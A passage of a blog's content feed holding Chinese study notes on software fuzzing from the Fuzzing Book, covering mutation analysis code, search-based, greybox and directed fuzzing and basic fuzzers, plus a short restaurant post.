class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">AdvPMIterator</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> pm<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>pm <span class="token operator">=</span> pm        self<span class="token punctuation">.</span>idx <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">__next__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> self<span class="token punctuation">.</span>idx        <span class="token keyword">if</span> i <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>changes<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> StopIteration<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>idx <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token comment"># there could be multiple changes in one mutant</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>changes<span class="token punctuation">)</span><span class="token comment"># </span>        <span class="token keyword">return</span> AdvMutant<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">,</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>changes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">AdvMutant</span><span class="token punctuation">(</span>Mutant<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> pm<span class="token punctuation">,</span> locations<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>pm <span class="token operator">=</span> pm        self<span class="token punctuation">.</span>i <span class="token operator">=</span> locations        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"%s_%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>name<span class="token punctuation">,</span>                               <span class="token string">'_'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> self<span class="token punctuation">.</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_src <span class="token operator">=</span> <span class="token boolean">None</span>            <span class="token keyword">def</span> <span class="token function">__getitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> test_module<span class="token punctuation">)</span><span class="token punctuation">:</span>        test_module<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>            self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> import_code<span class="token punctuation">(</span>            self<span class="token punctuation">.</span>src<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        <span class="token keyword">return</span> MutantTestRunner<span class="token punctuation">(</span>self<span class="token punctuation">,</span> test_module<span class="token punctuation">)</span>            <span class="token keyword">def</span> <span class="token function">generate_mutant</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> locations<span class="token punctuation">)</span><span class="token punctuation">:</span>        mutant_ast <span class="token operator">=</span> self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>mutator_object<span class="token punctuation">(</span>            locations<span class="token punctuation">)</span><span class="token punctuation">.</span>visit<span class="token punctuation">(</span>ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># copy</span>        <span class="token keyword">return</span> ast<span class="token punctuation">.</span>unparse<span class="token punctuation">(</span>mutant_ast<span class="token punctuation">)</span>           <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_src <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_src <span class="token operator">=</span> self<span class="token punctuation">.</span>generate_mutant<span class="token punctuation">(</span>self<span class="token punctuation">.</span>i<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_src      <span class="token keyword">class</span> <span class="token class-name">MutantTestRunner</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> mutant<span class="token punctuation">,</span> test_module<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>mutant <span class="token operator">=</span> mutant        self<span class="token punctuation">.</span>tm <span class="token operator">=</span> test_module    <span class="token keyword">def</span> <span class="token function">runTest</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> tc<span class="token punctuation">)</span><span class="token punctuation">:</span>        suite <span class="token operator">=</span> unittest<span class="token punctuation">.</span>TestSuite<span class="token punctuation">(</span><span class="token punctuation">)</span>        test_class <span class="token operator">=</span> self<span class="token punctuation">.</span>tm<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>tc<span class="token punctuation">]</span>        <span class="token keyword">for</span> f <span class="token keyword">in</span> test_class<span class="token punctuation">.</span>__dict__<span class="token punctuation">:</span>            <span class="token keyword">if</span> f<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'test_'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                suite<span class="token punctuation">.</span>addTest<span class="token punctuation">(</span>test_class<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span>        runner <span class="token operator">=</span> unittest<span class="token punctuation">.</span>TextTestRunner<span class="token punctuation">(</span>verbosity<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> failfast<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> ExpectTimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> runner<span class="token punctuation">.</span>run<span class="token punctuation">(</span>suite<span class="token punctuation">)</span>                <span class="token keyword">if</span> res<span class="token punctuation">.</span>wasSuccessful<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>mutant<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>un_detected<span class="token punctuation">.</span>add<span class="token punctuation">(</span>self<span class="token punctuation">)</span>                <span class="token keyword">return</span> res        <span class="token keyword">except</span> SyntaxError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Syntax Error (%s)'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>mutant<span class="token punctuation">.</span>name<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Unhandled exception during test execution'</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-The-Problem-of-Equivalent-Mutants"><a href="#10-The-Problem-of-Equivalent-Mutants" class="headerlink" title="10 The Problem of Equivalent Mutants"></a>10 The Problem of Equivalent Mutants</h3><p>在替换的过程中, 有可能会产生这种情况: 替换过后相当于没有替换. 并不会产生错误. 替换掉了一个无关紧要的语句. 把这种情况称为<code>equivalent mutants</code></p><p>要解决这个问题, 文章中说了两个方法</p><h4 id="10-1-Statistical-Estimation-of-Number-of-Equivalent-Mutants"><a href="#10-1-Statistical-Estimation-of-Number-of-Equivalent-Mutants" class="headerlink" title="10.1 Statistical Estimation of Number of Equivalent Mutants"></a>10.1 Statistical Estimation of Number of Equivalent Mutants</h4><p>利用正态分布</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211130104504.png" alt="Statistical Estimation"></p><h4 id="10-2-Statistical-Estimation-of-the-Number-of-Immortals-by-Chao’s-Estimator"><a href="#10-2-Statistical-Estimation-of-the-Number-of-Immortals-by-Chao’s-Estimator" class="headerlink" title="10.2 Statistical Estimation of the Number of Immortals by Chao’s Estimator"></a>10.2 Statistical Estimation of the Number of Immortals by Chao’s Estimator</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211130104746.png" alt="Chao&#39;s Estimator"></p><p>Note that these <strong>immortal mutants</strong> are somewhat different from the traditional equivalent mutants in that the mortality depends on the oracle used to distinguish variant behavior. That is, if one uses a fuzzer that relies on errors thrown to detect killing, <em>it will not detect mutants that produce different output but does not throw an error</em>. Hence, the <strong>Chao1</strong> estimate will essentially be <strong>the asymptote value of mutants the fuzzer can detect</strong> if it is given an infinite amount of time.</p><h3 id="Synopsis"><a href="#Synopsis" class="headerlink" title="Synopsis"></a>Synopsis</h3><p>This chapter introduces two methods of running <em>mutation analysis</em> on subject programs. The first class <code>MuFunctionAnalyzer</code> targets individual functions. Given a function <code>gcd</code> and two test cases evaluate, one can run mutation analysis on the test cases as follows —<code>第7小节</code></p><p>The second class <code>MuProgramAnalyzer</code> targets standalone programs with test suites. Given a program <code>gcd</code> whose source code is provided in <code>gcd_src</code> and the test suite is provided by <code>TestGCD</code>, one can evaluate the mutation score of <code>TestGCD</code> as follows</p><blockquote><p>个人感觉这两种方式的差距, 并没有很大. 甚至好像没什么区别-可能是我菜吧😥-🤣</p></blockquote><p>The <strong>mutation score</strong> thus obtained is a better indicator of the quality of a given test suite than pure coverage.</p><h3 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h3><p>为什么做这个, 怎么做, 这种方法有什么局限.又应该怎么改进.</p><blockquote><p>不得不说,作者的思路真的很清晰了.</p></blockquote><ul><li>We have learned why structural coverage is insufficient to evaluate the quality of test suites.</li><li>We have learned how to use Mutation Analysis for evaluating test suite quality.</li><li>We have learned the limitations of Mutation Analysis – Equivalent and Redundant mutants, and how to estimate them.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美食篇-7-东北菜</title>
      <link href="/2021/11/26/mei-shi-pian-7-dong-bei-cai/"/>
      <url>/2021/11/26/mei-shi-pian-7-dong-bei-cai/</url>
      
        <content type="html"><![CDATA[<h1 id="美食"><a href="#美食" class="headerlink" title="美食"></a>美食</h1><p>这次还是我和两个舍友,来的应该是第四次了把.</p><ul><li>地三鲜</li><li>溜肉段–这个居然时炸的,真醉了~~</li><li>饺子–韭菜鸡蛋\牛肉萝卜</li><li>锅包肉–我真快吃腻了,而且感觉没有上次在江安这边点的外卖(也是东北菜)好吃.</li></ul><p>![1]](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QQ%E5%9B%BE%E7%89%8720211126220221.jpg">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QQ图片20211126220221.jpg</a>)</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QQ%E5%9B%BE%E7%89%8720211126220234.jpg" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> 美食 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成都 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-3</title>
      <link href="/2021/11/22/bi-she-fuzz-3/"/>
      <url>/2021/11/22/bi-she-fuzz-3/</url>
      
        <content type="html"><![CDATA[<h1 id="NoteBook阅读"><a href="#NoteBook阅读" class="headerlink" title="NoteBook阅读"></a>NoteBook阅读</h1><h2 id="SearchBasedFuzzer"><a href="#SearchBasedFuzzer" class="headerlink" title="SearchBasedFuzzer"></a>SearchBasedFuzzer</h2><p>我们先不去对代码实现细节进行掌握, 先去掌握思想.</p><p>什么是基于搜索的测试? 为什么要用这种方式? 原话: <em><strong>Sometimes we are not only interested in fuzzing as many as possible diverse program inputs, but in deriving specific test inputs that achieve some objective, such as reaching specific statements in a program.</strong></em> 要产生特定的测试数据,从而到达程序中特定的位置.</p><p>这样的方式需要我们做哪些工作?</p><ul><li>首先,你要明确你要生成的数据类型和范围. <em>Maybe XML\String\Int etc. a-z\1-10</em></li><li>其次, 要定义在搜索空间内的适应度函数, 也就是你要能评价搜索到的数据距离目标的距离</li><li>然后, 定义搜索算法. 即按照什么样的方式\以何种顺序在搜索空间中搜素.<ul><li><strong>Hillclimbing</strong> 搜素范围规模不大.<em><strong>个人感觉根梯度下降非常相似,只不过在这里是离散的.</strong></em></li><li><strong>Genetic Algorithm</strong>搜素范围规模较大.<em><strong>结合了自然选择和种群进化的生物理论.</strong></em></li></ul></li></ul><h3 id="两个主要的算法"><a href="#两个主要的算法" class="headerlink" title="两个主要的算法"></a>两个主要的算法</h3><p>The <strong>hillclimbing algorithm</strong> itself is very simple: </p><ol><li>Take a random starting point</li><li>Determine fitness value of all neighbours</li><li>Move to neighbour with the best fitness value</li><li>If solution is not found, continue with step 2</li></ol><p>The <strong>GA emulates natural evolution</strong> with the following process:</p><ul><li>Create an initial population of random chromosomes</li><li>Select fit individuals for reproduction</li><li>Generate new population through reproduction of selected individuals</li><li>Continue doing so until an optimal solution has been found, or some other limit has been reached.</li></ul><blockquote><p>当然在具体的应用中, 还要设计到如何设计突变/如何选择种群/如何利用父代产生子代. 这些都需要跟实际情况相结合.</p></blockquote><h3 id="需要了解的一些背景知识"><a href="#需要了解的一些背景知识" class="headerlink" title="需要了解的一些背景知识"></a>需要了解的一些背景知识</h3><p>Python 源码到机器码的过程，以 CPython 为例，编译过程如下：</p><ul><li>将源代码解析为解析树（Parser Tree）</li><li>将解析树转换为抽象语法树（Abstract Syntax Tree）</li><li>将抽象语法树转换到控制流图（Control Flow Graph）</li><li>根据流图将字节码（bytecode）发送给虚拟机（ceval）</li></ul><p>可以使用以下模块进行操作：</p><ul><li>ast 模块可以控制抽象语法树的生成和编译</li><li>py-compile 模块能够将源码换成字节码（编译），保存在 <strong>pycache</strong> 文件夹，以 .pyc 结尾（不可读）</li><li>dis 模块通过反汇编支持对字节码的分析（可读）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-2</title>
      <link href="/2021/11/21/bi-she-fuzz-2/"/>
      <url>/2021/11/21/bi-she-fuzz-2/</url>
      
        <content type="html"><![CDATA[<h1 id="NoteBook阅读"><a href="#NoteBook阅读" class="headerlink" title="NoteBook阅读"></a>NoteBook阅读</h1><ul><li><input checked="" disabled="" type="checkbox"> 这一部分还是要再看看代码才行</li></ul><h2 id="Greybox-Fuzzing"><a href="#Greybox-Fuzzing" class="headerlink" title="Greybox Fuzzing"></a>Greybox Fuzzing</h2><h3 id="Blackbox-Mutation-base-Fuzzer"><a href="#Blackbox-Mutation-base-Fuzzer" class="headerlink" title="Blackbox Mutation-base Fuzzer"></a>Blackbox Mutation-base Fuzzer</h3><p>在这个测试里面,似乎只要是在population里面的seed,在权重上是一样的,换句话说就是被挑选的概率是一样的.</p><p>不过,按照我的理解, 按说这个权重应该是要变化的,可能在后面的讲解中会讲到吧</p><h3 id="Greybox-Mutation-base-Fuzzer"><a href="#Greybox-Mutation-base-Fuzzer" class="headerlink" title="Greybox Mutation-base Fuzzer"></a>Greybox Mutation-base Fuzzer</h3><p>我丢,从代码的角度上来看的话,灰盒测试无非是把<code>代码覆盖率</code>当成了加入<code>population</code>的一个准则</p><blockquote><p>原话: If we reach new coverage,add inp to population and its coverage to population_coverage</p></blockquote><h3 id="Boosted-Greybox-Fuzzer"><a href="#Boosted-Greybox-Fuzzer" class="headerlink" title="Boosted Greybox Fuzzer"></a>Boosted Greybox Fuzzer</h3><p>果不其然, 这个增强版的就用到了<code>energy</code>,也就是上面所讲的权重,它用了一个函数来计算.</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211121205144.png" alt="计算权重的公式"></p><p>这个指数后面文章所取的值是5</p><p>❓我不太清楚是, <code>coverage</code>只是一个数字, 如果只是数字的话, 那如何衡量路径呢? 因为即使是路径不同, <code>coveraige</code>也有可能是一样的.</p><blockquote><p>emm,很明显,<code>coverage</code>应该不仅仅是数字,他应该是<code>(执行函数名,行数)</code>这样的结构组成的😨</p></blockquote><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211121210348.png" alt="Boosted"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211121210407.png" alt="Original"></p><p>把<code>energy</code>分配给哪些执行次数相对较少的路径上, 以期再获得其他路径.</p><blockquote><p>The exponential power schedule shaves some of the executions of the “high-frequency path” off and adds them to the lower-frequency paths. The path executed least often is either not at all exercised using the traditional power schedule or it is exercised much less often.</p></blockquote><p><em><strong>Summary</strong></em>. By fuzzing seeds more often that exercise low-frequency paths, we can explore program paths in a much more efficient manner.</p><h2 id="Directed-Greybox-Fuzzing"><a href="#Directed-Greybox-Fuzzing" class="headerlink" title="Directed Greybox Fuzzing"></a>Directed Greybox Fuzzing</h2><p>本章用了一个迷宫来做案例, 迷宫的正确解恰恰对应于程序运行过程中运行次数最少的.</p><p>然后, 如何去评价一个路径的好坏, 本章节中采用了将程序调用图转换为有向图, 然后计算<code>路径最终节点</code>与<code>目标节点-出口</code>之间的距离.很显然这个距离越小, 说明距离<code>目标节点-出口</code>越近, 也就越接近出口.</p><p><em><strong>Summary</strong></em>. After pre-computing the function-level distance to the target, we can develop a power schedule that assigns more energy to a seed with a smaller average function-level distance to the target. By normalizing seed distance values between the minimum and maximum seed distance, we can further boost the directed power schedule.</p><blockquote><p>这部分说实话,真的没看懂..😥😥😥😥</p></blockquote><h2 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h2><ul><li>A <em>greybox fuzzer</em> generates thousands of inputs per second. Pre-processing and lightweight instrumentation <ul><li>allows to maintain the efficiency <em>during</em> the fuzzing campaign, and </li><li>still provides enough information to control progress and slightly steer the fuzzer.</li></ul></li><li>The <em>power schedule</em> allows to steer/control the fuzzer. For instance,<ul><li>Our <a href="#Fuzzer-Boosting">boosted greybox fuzzer</a> spends more energy on seeds that exercise “unlikely” paths. The hope is that the generated inputs exercise even more unlikely paths. This in turn increases the number of paths explored per unit time.</li><li>Our <a href="#Directed-Greybox-Fuzzing">directed greybox fuzzer</a> spends more energy on seeds that are “closer” to a target location. The hope is that the generated inputs get even closer to the target.</li></ul></li><li>The <em>mutator</em> defines the fuzzer’s search space. <a href="GreyboxFuzzer.ipynb#A-First-Attempt">Customizing the mutator</a> for the given program allows to reduce the search space to only relevant inputs. In a couple of chapters, we’ll learn about <a href="GreyboxGrammarFuzzer.ipynb">dictionary-based, and grammar-based mutators</a> to increase the ratio of valid inputs generated.</li></ul><p>从这也可以看出来,评价函数确实很重要. 虽然实现的目的都是一样的, 但是就实验的效果来看的话, 却是相差很远.</p><h2 id="Next-Steps"><a href="#Next-Steps" class="headerlink" title="Next Steps"></a>Next Steps</h2><p>Our aim is still to sufficiently cover functionality, such that we can trigger as many bugs as possible.  To this end, we focus on two classes of techniques:</p><ol><li><p>Try to cover as much <em>specified</em> functionality as possible.  Here, we would need a <em>specification of the input format,</em> distinguishing between individual input elements such as (in our case) numbers, operators, comments, and strings – and attempting to cover as many of these as possible.  We will explore this as it comes to <a href="GrammarFuzzer.ipynb">grammar-based testing</a>, and especially in <a href="GreyboxGrammarFuzzer.ipynb">grammar-based mutations</a>.</p></li><li><p>Try to cover as much <em>implemented</em> functionality as possible.  The concept of a “population” that is systematically “evolved” through “mutations” will be explored in depth when discussing <a href="SearchBasedFuzzer.ipynb">search-based testing</a>.  Furthermore, <a href="SymbolicFuzzer.ipynb">symbolic testing</a> introduces how to systematically reach program locations by solving the conditions that lie on their paths.</p></li></ol><p>These two techniques make up the gist of the book; and, of course, they can also be combined with each other.  As usual, we provide runnable code for all.  Enjoy!</p><blockquote><p>从这里的描述来看, <code>specified functionality</code> 和 <code>implemented functionality</code> 是不同的两个概念</p></blockquote><hr><p>看到现在的话,其实作者的思路,我们大概也清楚的知道了一些</p><ul><li><ol><li>我们只是简单地随机产生字符串</li></ol></li><li><ol start="2"><li>紧接着, 我们不满足于仅仅产生随机的字符串, 进而使用了<code>coverage</code>—<code>measure the effectiveness of different test generation techniques, but also to guide test generation towards code coverage.</code></li></ol></li><li><ol start="3"><li>有了<code>coverage</code>之后, 还不行, 因为总有一些路径几乎不被执行, 相反一些路径被执行的次数却很多. 倒也不是说这样不好, 只是 <code>By fuzzing seeds more often that exercise low-frequency paths, we can explore program paths in a much more efficient manner.</code> 所以又引入了 <code>Power Schedules</code><blockquote><p><strong>We call the likelihood with which a seed is chosen from the population as the seed’s energy.</strong> Throughout a fuzzing campaign, we would like to prioritize seeds that are more promising. Simply said, we do not want to waste energy fuzzing non-progressive seeds. <em><strong>We call the procedure that decides a seed’s energy as the fuzzer’s <strong>power schedule</strong></strong></em>. For instance, AFL’s schedule assigns more energy to seeds that are shorter, that execute faster, and yield coverage increases more often. </p></blockquote></li></ol></li><li><ol start="4"><li>但是有了这些还是不行, 因为虽然产生的随机字符串有了一定的质量, 但是在语法上, 还是比较欠缺.<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211121212317.png" alt="针对HtmlParser产生的字符串"></li></ol><blockquote><p>The greybox fuzzer executes much more complicated inputs, many of which include special characters such as opening and closing brackets and chevrons (i.e., &lt;, &gt;, [, ]). Yet, many important keywords, such as <html> are still missing.</p></blockquote><p>  所以,下面一章就要将<code>grammars</code>的部分了</p></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-1</title>
      <link href="/2021/11/19/bi-she-fuzz-1/"/>
      <url>/2021/11/19/bi-she-fuzz-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Fuzzer"><a href="#Fuzzer" class="headerlink" title="Fuzzer"></a>Fuzzer</h2><p>这是在GitHub上,找到的一个在线的书籍,讲解Fuzz的<br><a href="https://hub.gke2.mybinder.org/user/uds-se-fuzzingbook-ktofhf06/notebooks/docs/notebooks/Fuzzer.ipynb">https://hub.gke2.mybinder.org/user/uds-se-fuzzingbook-ktofhf06/notebooks/docs/notebooks/Fuzzer.ipynb</a></p><p>简单来说, 就是随机生成字符串, 在接受输入的地方及进行测试. 并且对程序崩溃的原因进行整理.</p><p>发现的问题就包括了缓冲区溢出/缺少错误输入的检查/极端值的验证等常见的错误</p><h3 id="Generic-Checker-泛型检测器"><a href="#Generic-Checker-泛型检测器" class="headerlink" title="Generic Checker(泛型检测器)"></a>Generic Checker(泛型检测器)</h3><h4 id="Memory-Accesses"><a href="#Memory-Accesses" class="headerlink" title="Memory Accesses"></a>Memory Accesses</h4><p><strong>LLVM Address Sanitizer</strong> which detects a whole set of potentially dangerous memory safety violations. 将这个嵌入到c程序中,并进行编译, 当访问越界的地址时, 会提示报错, 被给出一个详细的说明.</p><p>![报错示意图]](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211119145215.png">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211119145215.png</a>)</p><p>HeartBleed bug 就是这么被测试出来的. OpenSSl库里面的漏洞</p><h4 id="Information-Leak"><a href="#Information-Leak" class="headerlink" title="Information Leak"></a>Information Leak</h4><p>信息泄露可能不仅仅出现访问非法的地址, 同样有可能出现在合法地址中. 如果合法地址中包含了不应该泄露的敏感信息. 这种情况下, <code>Address Sanitizer</code>不会报错, 因为访问的是”合法”地址.</p><p>要应对这样的问题, 需要检查返回的字符串中, 是否包含了不应该出现的信息</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211119151350.png" alt="信息泄露检查"></p><h3 id="定制检查"><a href="#定制检查" class="headerlink" title="定制检查"></a>定制检查</h3><p>充分地利用assertion, 检查重要函数的input和result. 充分使用assertion可以提高检测到泛型检查器无法检查到的错误.</p><h4 id="Check-the-integrity-of-complex-data-structures"><a href="#Check-the-integrity-of-complex-data-structures" class="headerlink" title="Check the integrity of complex data structures"></a>Check the integrity of complex data structures</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211119152317.png" alt="检查数据结构"></p><p>这个具体的检查,感觉就好像是编程中的问题, 要在改变重要数据结构前后, 都要验证数据结构的合法性. <code>. Whenever an element is added or deleted, all these consistency checks are run automatically.</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211119155255.png" alt="repOK()类型的检测"></p><p>虽然这些检测 <code>documents all the assumptions and checks them as well</code> 仅仅针对于我们个人写的程序和问题, 但是可以帮助我们找到问题, 同时也能帮助其他程序员理解我们的代码并避免错误.</p><h3 id="Fuzzing-结构"><a href="#Fuzzing-结构" class="headerlink" title="Fuzzing 结构"></a>Fuzzing 结构</h3><ul><li><code>Fuzzer</code> 作为<code>fuzzers</code>的一个基类 </li><li><code>Runner</code> 作为运行程序和检测的一个基类</li></ul><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211120152158.png" alt="Fuzzer"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211120152415.png" alt="Runner"></p><h3 id="Lesson-Learned"><a href="#Lesson-Learned" class="headerlink" title="Lesson Learned"></a>Lesson Learned</h3><ul><li>Randomly generating inputs (“fuzzing”) is a simple, cost-effective way to quickly test arbitrary programs for their robustness.</li><li>Bugs fuzzers find are mainly due to errors and deficiencies in input processing.</li><li>To catch errors, have as many consistency checkers as possible.</li></ul><h2 id="Mutation-Based-Fuzzing"><a href="#Mutation-Based-Fuzzing" class="headerlink" title="Mutation-Based Fuzzing"></a>Mutation-Based Fuzzing</h2><p>这是上一本在结尾时推荐出来的<br><a href="https://hub.gke2.mybinder.org/user/uds-se-fuzzingbook-whv6pm2k/notebooks/docs/notebooks/MutationFuzzer.ipynb">https://hub.gke2.mybinder.org/user/uds-se-fuzzingbook-whv6pm2k/notebooks/docs/notebooks/MutationFuzzer.ipynb</a></p><p>最初所生产出来的模糊字符串, 很多都是无效的. 在测验的过程中, 很快就被程序拒绝了. 现在提出的方法叫 <strong>基于突变的Fuzz</strong>, 要在现有输入上做微小的改动, 使其仍然保持有效性. </p><p>看到后面还得需要去在补前面的<code>Code Coverage</code>的定义😱😱😱😱</p><hr><h2 id="已补完😀😀"><a href="#已补完😀😀" class="headerlink" title="已补完😀😀"></a>已补完😀😀</h2><p>在知道这个Code Coverage之后呢, 我们就可以把<strong>通过检测以及Code Coverage有上升/或者从未出现过</strong>的fuzz字符串保存下来.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MutationCoverageFuzzer</span><span class="token punctuation">(</span>MutationFuzzer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reset<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>coverages_seen <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Now empty; we fill this with seed in the first fuzz runs</span>        self<span class="token punctuation">.</span>population <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> runner<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Run function(inp) while tracking coverage.           If we reach new coverage,           add inp to population and its coverage to population_coverage        """</span>        result<span class="token punctuation">,</span> outcome <span class="token operator">=</span> <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run<span class="token 